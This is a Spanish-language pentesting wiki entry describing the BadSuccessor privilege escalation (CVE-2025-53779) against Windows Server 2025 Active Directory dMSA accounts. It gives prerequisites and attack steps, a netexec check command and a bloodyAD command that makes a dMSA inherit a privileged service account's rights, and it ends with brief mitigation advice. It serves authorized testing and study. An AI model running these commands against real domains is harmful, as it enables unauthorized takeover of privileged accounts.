---
title: BadSuccessor (CVE-2025-53779)
resumen: Escalar heredando los privilegios de una cuenta de servicio privilegiada, abusando de las cuentas dMSA de Windows Server 2025.
tags: netexec, ldap-tools
---

## Definición

Vulnerabilidad crítica (**CVE-2025-53779**) descubierta en 2025 que afecta a entornos Active Directory con controladores de dominio en **Windows Server 2025**. El fallo reside en las nuevas cuentas **dMSA** (*delegated Managed Service Accounts*): un usuario con permisos de escritura sobre una OU que contenga cuentas dMSA, **y** permisos de escritura sobre el objeto de una cuenta de servicio privilegiada del dominio, puede hacer que la dMSA herede automáticamente los privilegios de esa cuenta objetivo — sin necesidad de conocer sus credenciales.

## Cuándo se usa

Contra dominios con al menos un DC en Windows Server 2025 (el rol de dMSA es nuevo en esta versión), cuando se ha identificado, vía BloodHound o revisión manual de ACLs, una OU con cuentas dMSA sobre la que el usuario actual tiene permisos de escritura.

## Requisitos previos

- Al menos un DC con Windows Server 2025.
- Permisos de escritura sobre una OU con cuentas dMSA configuradas.
- Permisos de escritura sobre el objeto de la cuenta de servicio privilegiada objetivo.

## Desarrollo del ataque

1. Confirmar que el dominio es vulnerable (versión del Windows Server y existencia de una OU con dMSA sobre la que se tienen permisos).
2. Identificar la cuenta de servicio privilegiada objetivo.
3. Forzar que la dMSA herede los privilegios de esa cuenta objetivo.
4. Autenticarse como la dMSA para operar con los privilegios heredados.

```bash
# Confirmar que el entorno es vulnerable con el módulo de netexec
nxc ldap dc01 -u "usuario" -p 'contraseña' -M badsuccessor
```

```bash
# Forzar la herencia de privilegios (bloodyAD), usando un ticket ya en memoria (PtT)
bloodyAD -k ccache=usuario.ccache --dc-ip IP --host dc01.dominio.local -d dominio.local \
  add badSuccessor userdMSA -t "CN=svc_privilegiada,OU=ServiceAccounts,DC=dominio,DC=local" --ou "OU=MSAHolder,DC=dominio,DC=local"
```

## Herramientas relacionadas

- Ver [[netexec]]
- Ver [[ldap-tools]] (bloodyAD)

## Detección y mitigación

Aplicar el parche/mitigación oficial de Microsoft en cuanto esté disponible para el entorno, restringir al mínimo los permisos de escritura sobre OUs que contengan cuentas dMSA, y auditar la creación/modificación de cuentas dMSA y sus atributos de delegación.
